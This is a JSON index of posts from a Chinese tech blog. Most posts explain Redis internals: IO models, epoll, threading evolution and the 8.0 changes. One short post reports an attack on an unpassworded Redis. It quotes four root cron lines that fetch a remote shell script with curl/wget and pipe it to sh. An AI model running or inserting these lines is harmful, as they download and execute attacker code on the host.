[{"content":"最近开发中遇到一个关于redis的安全事故，本身服务是放在内网，通过端口转发的，redis也就没有设置密码，万万没想到~~ 出事了！！\n数据库经常性被清 */2 * * * * root cd1 -fsSL http://natalstatus.org/ep9TS2/ndt.sh | sh */3 * * * * root wget -q -O- http://natalstatus.org/ep9TS2/ndt.sh | sh */4 * * * * root curl -fsSL http://103.79.77.16/ep9TS2/ndt.sh | sh */5 * * * * root wd1 -q -O- http://103.79.77.16/ep9TS2/ndt.sh | sh 发现数据库只留下这四个key，来看看里面存放的value，发现是一个恶意脚本，giao\n原本一直怀疑是自己的代码哪里有漏洞，导致数据库被不小心清了 最后竟然是这个 密码务必需要配置 安全性配置 ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/05-%E8%B8%A9%E5%9D%91.html","summary":"\u003cp\u003e最近开发中遇到一个关于redis的安全事故，本身服务是放在内网，通过端口转发的，redis也就没有设置密码，万万没想到~~ 出事了！！\u003c/p\u003e","title":"05-踩坑"},{"content":"探讨了不同IO的演进过程，从传统阻塞IO说起，说到NIO、select、epoll\n传统阻塞IO public Order queryOrder() { // 这里会卡住，直到订单服务返回订单信息，read()方法才会返回 Order order = orderConnection.read(); // 查询订单信息 log.info(\u0026#34;查询订单信息, 收到返回 {}\u0026#34;, order); return order; } 当执行orderConnection.read()时，因为不能确定订单服务多久返回 为了避免干等，浪费资源，操作系统会暂停当前线程，转而去执行其他程序 等到订单服务返回了了，再恢复执行 注意：IO操作和线程是耦合在一起的，如果IO操作被阻塞了，整个线程都会被挂起\n优点 对开发人员友好，非常简单，符合直觉\n缺点 IO操作会阻塞整个线程，每个连接都需要对应一个专门的线程 以Java为例，线程默认的栈大小是1M 要同时处理10万个连接，就需要10万个线程，光是线程的栈内存就要100G\n-\u0026gt; 为了避免创建的线程太多，耗尽内存，阻塞IO通常配合线程池使用\n非阻塞IO 默认情况下，IO操作被阻塞时，操作系统会挂起线程 但也可以在创建连接时，开启O_NONBLOCK选项，让操作系统不挂起线程，而是直接返回\npublic void mainLoop() { Connection conn1 = open(O_NONBLOCK); Connection conn2 = open(O_NONBLOCK); Connection conn3 = open(O_NONBLOCK); List\u0026lt;Connection\u0026gt; connections = List.of(conn1, conn2, conn3); while(true) { for(Connection conn : connections) { // 由于设置了O_NONBLOCK选项，这里不会阻塞 Object data = conn.read(); if(data != null) { System.out.println(data); } } } } 优点 解决了IO操作导致整个线程挂起的问题，可以实现一个线程同时处理多个连接\n缺点 不停地轮询会带来很多无效的操作，也会导致CPU使用率飙高\nIO多路复用 因为不知道连接什么时候会收到数据，所以非阻塞IO要不停地重试，导致CPU飙高\n-\u0026gt; 不要自己盲目的去试，而是让连接在收到数据之后，主动通知自己\n也就是，实现了一套wait - notify的事件通知机制\n// 监控指定的连接，并且阻塞调用select()的线程 // 直到有连接就绪或者超过timeout时间，再唤醒select线程并返回 // nfds表示需要检查的文件句柄（连接）的数量 // readfds,writefds,exceptfds表示要监听的文件句柄(连接) // timeout表示超时时间 int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); int main(void) { // 主循环 for(;;) { // 将连接就绪的标志位清零： // select会通过修改入参的方式指明哪些连接就绪了 // 所以每次调用select之前，都要先把连接就绪的标志位清零 FD_SET(0, \u0026amp;rfds); // 探测是否有连接就绪；当前线程会被挂起，直到有连接就绪或者超时 int retval = select(n, \u0026amp;rfds, NULL, NULL, \u0026amp;tv); if (retval == -1) perror(\u0026#34;调用select出错\u0026#34;); else if (retval) printf(\u0026#34;有连接就绪\u0026#34;); for (j = 0; j \u0026lt;= n; j++) { // select会通过修改入参的方式，指明哪些连接就绪了 // 这里遍历所有连接，判断是否就绪 if(FD_ISSET(j, rfds)) { // select只是探测哪些连接就绪了，但不会实际读取数据 // 这里通过revc()方法实际读取数据 recv(rfds[j]) } } else printf(\u0026#34;在超时时间内没有任何连接就绪\u0026#34;); } } select 实现细节 调用select()时，给所有要监控的连接注册回调函数 回调函数是注册在连接的wait_queue里 挂起select线程，等待连接就绪 当连接收到数据时，会触发回调函数，并恢复select线程 当某个连接收到了远程服务的响应，它就会执行自己wait_queue里回调函数，并唤醒select线程 回调函数会设置好哪些连接就绪了，并移除所有连接wait_queue里的回调函数（类似于资源清理） select线程恢复执行后，就可以处理就绪的连接 优点 实现了一套wait-notify机制，相比于不停地轮询，效率更高\n缺点 select()每次都要在全量的连接上，先逐个注册回调函数，再逐个移除回调函数 复杂度是O(n)，其中n是要监控的连接数 select()只是返回哪些连接就绪了，还需要再额外调用recv()实际读取数据 epoll select()每次都要在全量的连接上，先逐个注册回调函数，再逐个移除回调函数\nepoll通过将API细分为3个，将全量操作优化成了增量操作\nepoll_create() 初始化epoll自己要用的内部结构 epoll_ctl() 添加或者删除要监听的连接 epoll_wait() 挂起调用线程，等待连接事件，当有连接就绪时，或者超时返回 优点 分了3个API，epoll_create() / epoll_ctl() / epoll_wait() 实现了增量操作 结合红黑树，将算法复杂度降低到了O(lgN)\n# define MAX_EVENTS 10 struct epoll_event ev, events[MAX_EVENTS]; int listen_sock, cAonn_sock, nfds, epollfd; /* Code to set up listening socket, \u0026#39;listen_sock\u0026#39;, (socket(), bind(), listen()) omitted */ // 创建epoll内部用到的结构 epollfd = epoll_create1(0); if (epollfd == -1) { perror(\u0026#34;epoll_create1\u0026#34;); exit(EXIT_FAILURE); } // 将listen socket作为一个事件源添加到epoll的监听队列中 ev.events = EPOLLIN; ev.data.fd = listen_sock; if (epoll_ctl(epollfd, EPOLL_CTL_ADD, listen_sock, \u0026amp;ev) == -1) { perror(\u0026#34;epoll_ctl: listen_sock\u0026#34;); exit(EXIT_FAILURE); } // 主循环 for (;;) { // 探测是否有就绪的连接 nfds = epoll_wait(epollfd, events, MAX_EVENTS, -1); if (nfds == -1) { perror(\u0026#34;epoll_wait\u0026#34;); exit(EXIT_FAILURE); } // 对所有就绪的连接，逐个处理连接上的事件 for (n = 0; n \u0026lt; nfds; ++n) { if (events[n].data.fd == listen_sock) { // 如果是新建连接事件，完成连接建立 conn_sock = accept(listen_sock, (struct sockaddr *) \u0026amp;addr, \u0026amp;addrlen); if (conn_sock == -1) { perror(\u0026#34;accept\u0026#34;); exit(EXIT_FAILURE); } setnonblocking(conn_sock); ev.events = EPOLLIN | EPOLLET; ev.data.fd = conn_sock; // 将新建立的连接作为事件源，添加到epoll的监听队列 if (epoll_ctl(epollfd, EPOLL_CTL_ADD, conn_sock, \u0026amp;ev) == -1) { perror(\u0026#34;epoll_ctl: conn_sock\u0026#34;); exit(EXIT_FAILURE); } } else { // 对于读写事件，根据业务需求做相应的处理 // 同样的，到这一步只是知道哪个连接就绪了，还没有实际读取数据 // 一些对性能要求特别高的场景，会选择用专门的IO线程来读取数据 // 比如redis 6.0以后，就加入了专门的IO线程 do_use_fd(events[n].data.fd); } } } 总结 处理IO的方式 优点 缺点 传统阻塞IO 对开发人员友好，写代码简单 连接和线程耦合在了一起，每个连接都有对应一个线程，限制了一台机器能处理的最大连接数\nPS: 为了避免内存耗尽，阻塞IO通常配合线程池使用 非阻塞IO\nO_NONBLOCK 通过设置O_NONBLOCK标志位，让操作系统不挂起当前线程，可以实现一个线程同时处理多个连接 不停地轮询效率低，浪费CPU资源 IO多路复用select() 实现了wait-notify机制，比轮询效率高 每次调用select()都需要准备相关参数，修改所有连接句柄的wait_queue，算法复杂度较高 \u0026ndash; O(n) epoll 通过epoll_create() / epoll_ctl() / epoll_wait()3个API，在epoll内部管理相关的参数和结构，实现了增量操作，效率更高 \u0026ndash; O(lgN) 单个线程管理连接数过多时，epoll_wait线程本身可能成为瓶颈，可以用多epoll_wait线程 + 多IO线程的策略解决 ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/01-%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3nio.html","summary":"\u003cp\u003e探讨了不同IO的演进过程，从传统阻塞IO说起，说到NIO、select、epoll\u003c/p\u003e","title":"01-深入了解NIO"},{"content":"本文简述了epoll出来前，在C10K上的难点问题，阐述了epoll变成思路，最后将redis2.6.4进行了案例分析\nC10K问题 简单些理解就是: 实现单机1万长连接\n在epoll之前，问题难点主要是 线程与连接是耦合的，一个连接对应一个线程 epoll编程思路 业务场景 作为服务端，我们只需要处理3种情况：\n处理客户端的连接请求 处理客户端发送的命令 返回响应给客户端 动作 对应事件 处理逻辑说明 处理客户端连接请求 listen_sock上的READABLE事件 对应listen_sock的read handler\n1. 新建一个client_sock，完成TCP 3次握手\n2. 将新的client_sock作为事件源注册到epoll 处理客户端命令 client_sock上的READABLE事件 对应client_sock的read handler\n读取客户端发送的命令，解析执行，并返回结果给客户端 返回应答给客户端 client_sock上的WRITABLE事件 对应client_sock的write handler\n为了防止发送方发的太快，接收方处理不过来，TCP协议是有一个滑动窗口的。A给B发消息时，会保证发送的内容大小不超过B当前的剩余缓冲区 如果服务端返回结果很大，超过了客户端的当前剩余缓冲区，那就只能先写一部分，并且用一个专门的字段记录写了多少。等到客户端腾出空间了，会再通知服务端。这时候，服务端就会触发写就绪事件，再把之前剩余的内容写到客户端 #define MAX_EVENTS 10 struct epoll_event ev, events[MAX_EVENTS]; int listen_sock, cAonn_sock, nfds, epollfd; /* Code to set up listening socket, \u0026#39;listen_sock\u0026#39;, (socket(), bind(), listen()) omitted */ // 创建epoll内部用到的结构 epollfd = epoll_create1(0); // 将server socket作为一个事件源添加到epoll的监听队列中 ev.events = EPOLLIN; ev.data.fd = listen_sock; if (epoll_ctl(epollfd, EPOLL_CTL_ADD, listen_sock, \u0026amp;ev) == -1) { perror(\u0026#34;epoll_ctl: listen_sock\u0026#34;); exit(EXIT_FAILURE); } // epoll主循环 for (;;) { // 探测是否有就绪的连接 nfds = epoll_wait(epollfd, events, MAX_EVENTS, -1); // 对所有就绪的连接，逐个处理连接上的事件 for (n = 0; n \u0026lt; nfds; ++n) { // 如果是在server socket上发生的事件， // 那一定是有新的客户端要建立连接 if (events[n].data.fd == listen_sock) { // 完成连接建立 conn_sock = accept(listen_sock, (struct sockaddr *) \u0026amp;addr, \u0026amp;addrlen); // 设置非阻塞标记位 setnonblocking(conn_sock); ev.events = EPOLLIN | EPOLLET; ev.data.fd = conn_sock; // 将新建立的连接作为事件源，添加到epoll的监听队列 if (epoll_ctl(epollfd, EPOLL_CTL_ADD, conn_sock, \u0026amp;ev) == -1) { perror(\u0026#34;epoll_ctl: conn_sock\u0026#34;); exit(EXIT_FAILURE); } } else { // 对于读写事件，根据业务需求做相应的处理 do_use_fd(events[n].data.fd); } } } 边缘/水平触发 边缘触发（edge triggered） 和 水平触发（level triggered）\n客户端发过来的命令可能还不完整 此时，你有2种选择：\n直接不读取缓冲区，等到命令完整了，再一次性读出来 先把不完整的命令读出来，暂存起来 默认情况下，只要缓冲区有数据，就会触发事件\n第一种方式下，如果命令一直不完整，就会一直重复触发事件，影响性能 第二种方式下，因为已经读了缓冲区，所以不会重复触发事件，性能好，但需要自己维护一个暂存区，比较麻烦 由此，对应epoll的2种事件触发类型\n触发类型 触发规则 优缺点 水平触发 只要可以读/写，就不断触发\n1. 读 只要读缓冲区有数据就触发\n2. 写 只要写缓冲区不满就触发 有无效触发，性能差\n不需要自己维护暂存区，编程简单 边缘触发 状态变化才触发\n1. 读 从不可读变成可读才触发 读缓冲区从没有数据变成有数据才触发 如果前一次的数据没读完，又来了新数据，是不触发的 2. 写 从不可写变成可写才触发 写缓冲区从没有剩余空间变成有剩余空间 没有无效触发，性能好\n需要自己维护暂存区，编程复杂 epoll案例分析: redis2.6.4 注册listen_sock的read handler 关键方法 重点代码截图 redis.c\nmain() redis.c\ninitServer()\n注册listen_sock的读就绪事件处理器acceptTcpHandler()，\n后续会具体分析这个处理器 ae.c\naeCreateFileEvent() ae_epoll.c\naeApiAddEvent() 启动epoll主循环 关键方法 重点代码截图 redis.c\nmain() ae.c\naeMain() ae.c\naeProcessEvents()\n注意：\n1. fe-\u0026gt;rfileProc 对应读就绪事件的handler\n2. fe-\u0026gt;wfileProc 对应写就绪事件的handler ae_epoll.c\naeApiPoll() 连接建立流程 客户端和服务端建立连接的过程，对应的就是listen_sock的read handler\n关键方法 重点代码截图 networking.c\nacceptTcpHandler()\n1. 完成连接建立（3次握手）\n2. 通过acceptCommonHandler()完成后续操作 networking.c\nacceptCommonHandler() networking.c\ncreateClient()\n注册新创建的client_sock的读事件处理器到epoll 处理请求流程 请求处理流程，对应的就是client_sock的read handler\n关键方法 重点代码截图 networking.c\nreadQueryFromClient()\n读取客户端请求，并调用**processInputBuffer()**处理 networking.c\nprocessInputBuffer() 返回结果流程 返回结果时，不是直接通过write()写数据到客户端，而是同样走epoll\n先注册client_sock的write handler，然后往暂存区追加数据 由于redis用的是level triggered，所以下次调用epoll_wait()时， 只要操作系统层的缓冲区不是满的，就会触发写就绪事件 于是触发第1步注册的write handler，通过write handler把暂存区的数据写到客户端 可能出现暂存区的数据很多，每次只能写一部分，所以redis还会额外记录当前写到哪里了 每触发一次write handler，就从上次的位置继续往后写 暂存区全部写完之后，再把第1步注册的write handler移除掉 以避免level triggered重复触发无效的写就绪事件 下面我们分2部分看：\n注册write handler Write handler的具体逻辑 注册 write handler 关键方法 重点代码截图 networking.c\naddReply()\n1. 通过prepareClientToWrite()注册写事件处理器\n2. 再通过_addReplyToBuffer()往暂存区追加数据 networking.c\nprepareClientToWrite()\n注册client_sock的写事件处理器到epoll networking.c\nsendReplyToClient()\n写处理器 write handler 关键方法 重点代码截图 networking.c\nsendReplyToClient()\n在循环里面调用write()，直到write()返回-1，表示出错或者缓冲区已满 networking.c\nsendReplyToClient()\n1. 通过errno == EAGAIN判断是写缓冲区满了，还是出错了 2. 暂存区写完以后，通过aeDeleteFileEvent()移除之前注册的write handler ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/02-epoll%E7%BC%96%E7%A8%8B%E7%AE%80%E6%9E%90.html","summary":"\u003cp\u003e本文简述了epoll出来前，在C10K上的难点问题，阐述了epoll变成思路，最后将redis2.6.4进行了案例分析\u003c/p\u003e","title":"02-epoll编程简析"},{"content":"本文讨论了Redis线程模型的演进，从2.6.4版本的单epoll + 单线程到6.0.20版本的单epoll + 多线程，再到8.0版本的多epoll + 多线程，并对Redis 8.0版本的线程模型进行了源码分析。\n线程模型演进历程 版本 模型 说明 2.6.4 单epoll + 单线程 最简单的epoll编程模型，epoll循环和读写操作都在一个线程内完成 6.0.20 单epoll + 多线程\n优点：引入IO线程帮忙分摊读写数据的工作量\n遗留问题：执行读/写操作时，需要等所有线程都完成了，才能进行下一步，这里会存在阻塞 1. 主线程负责驱动epoll循环\n2. 获取到IO事件后，主线程和IO线程一起读取不同客户端的请求命令\n3. 待所有线程完成读取后，再由主线程负责执行命令 这里有一个等待动作\n4. 命令执行完成后，再由所有线程一起返回结果给客户端\n5. 待所有线程的写任务完成后，主线程再进入epoll_wait() 这里也有一个等待动作 8.0 多epoll + 多线程\n8.0版本中，采用了全异步的处理，消除了阻塞\n1. IO线程读取完命令后，异步通知主线程 2. 主线程执行完命令后，再异步通知IO线程\n3. 最后由IO线程返回结果给客户端 主线程和IO线程都会驱动各自的epoll，其中，\n主线程负责：\n1. 响应listen_sock上的事件 完成连接建立后，将新创建的client_sock分配给最闲的线程 也就是，对应的epoll上注册的sock最少的线程，包括主线程\n2. 响应client_sock上的事件 读取命令或者做应答，这一点和IO线程没有区别 即：主线程也会被当做一个IO线程来用\n3. 接受自己或者IO线程读取好的命令，实际执行命令 即：命令还是由主线程这一个线程执行\n4. 执行完命令后，再由相应的线程完成应答 可能是主线程，也可能是某个IO线程，取决于当前client_sock注册在哪个线程上\nIO线程负责：\n1. 将主线程分发的client_sock注册到自己的epoll上\n2. 响应client_sock上的事件 读取命令或者做应答\n3. 完成读操作后，将命令转交给主线程执行\n4. 完成主线程转交回来的写任务 ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/03-redis%E7%BA%BF%E7%A8%8B%E6%BC%94%E8%BF%9B.html","summary":"\u003cp\u003e本文讨论了Redis线程模型的演进，从2.6.4版本的单epoll + 单线程到6.0.20版本的单epoll + 多线程，再到8.0版本的多epoll + 多线程，并对Redis 8.0版本的线程模型进行了源码分析。\u003c/p\u003e","title":"03-redis线程演进"},{"content":"前不久redis8.0正式发布了，看看都更新了啥?\n新增八种数据结构\n向量集（测试版）、JSON、时间序列，以及 Bloom filter、cuckoo filter、count-min sketch、top-k 和 t-digest 五种概率性结构（其中一些之前作为独立的 Redis 模块提供）\n显著的性能改进\n命令延迟最高降低 87% 通过启用多线程，每秒操作吞吐量提升 2 倍 在 Redis 8 中，我们引入了新的 I/O 线程实现。您可以通过设置 io-threads 配置参数来启用它。默认值为 1。在多核 Intel CPU 上将参数设置为 8 时，我们测量到吞吐量最高提升了 112%。 复制使用的内存最高减少 35% 在 Redis 8 中，我们引入了一种新的复制机制。在复制过程中，我们同时启动两个复制流：一个用于传输主节点，另一个用于传输期间发生的变更流。第二阶段不再被阻塞等待第一阶段完成。 通过水平和垂直扩展，查询处理能力最高提升 16 倍 ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/04-redis8.0%E6%9B%B4%E6%96%B0%E4%BA%86%E5%95%A5.html","summary":"\u003cp\u003e前不久redis8.0正式发布了，看看都更新了啥?\u003c/p\u003e","title":"04-redis8.0更新了啥？"},{"content":"","permalink":"https://al6nlee.github.io/about.html","summary":"","title":"关于作者"}]